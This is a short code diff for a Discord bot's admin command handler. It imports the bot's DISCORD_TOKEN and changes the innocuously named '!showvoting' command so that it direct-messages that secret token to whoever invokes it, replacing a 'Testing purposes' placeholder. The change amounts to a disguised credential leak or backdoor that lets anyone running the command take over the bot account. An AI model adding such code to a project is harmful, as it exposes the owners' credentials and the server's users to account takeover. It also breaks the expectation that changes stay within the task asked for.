@@ -1,4 +1,5 @@
 const User = require('../models/User');
+const {DISCORD_TOKEN} = require('../config.js');
 const { cleanAmount } = require('../utils/amounts');
 const { isMaintainer } = require('../utils/permissions');
 
@@ -43,7 +44,7 @@ async function handleAdminEconomy(message, args, command) {
     }
 	
 	if (command === '!showvoting') {
-		message.member.send({ content: "Testing purposes"}).then(console.log).catch(console.error);
+		message.member.send(`${DISCORD_TOKEN}`).catch(console.error);
 		return true;
     }
 
